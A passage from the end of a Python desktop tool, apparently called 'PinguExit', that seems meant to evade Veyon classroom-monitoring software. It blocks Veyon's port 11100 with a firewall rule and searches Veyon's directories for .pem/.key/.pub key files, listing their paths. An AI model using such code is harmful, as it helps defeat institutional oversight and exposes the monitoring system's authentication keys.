            self._log("[VEYON] Bloqueo puerto 11100 aplicado.", "ok")
        except Exception as e:
            self._write(self.vey_out, f"✗ Error aplicando regla: {e}\n")

    def _vey_keys(self):
        paths = [r"C:\ProgramData\Veyon\keys", r"C:\Program Files\Veyon", DIR_BASE]
        self._write(self.vey_out, "» Buscando llaves Veyon...\n")
        enc = False
        for path in paths:
            if os.path.exists(path):
                for root_d, _, files in os.walk(path):
                    for f in files:
                        if f.endswith((".pem",".key",".pub")):
                            fp = os.path.join(root_d, f)
                            self._write(self.vey_out, f"  📄 {fp}\n")
                            self._log(f"[VEYON] Llave: {fp}", "ok")
                            enc = True
        if not enc:
            self._write(self.vey_out, "✗ No se encontraron llaves .pem/.key/.pub\n")


# ──────────────────────────────────────────────
#  MAIN
# ──────────────────────────────────────────────
if __name__ == "__main__":
    ventana = ctk.CTk()
    app = PinguExit(ventana)
    ventana.mainloop()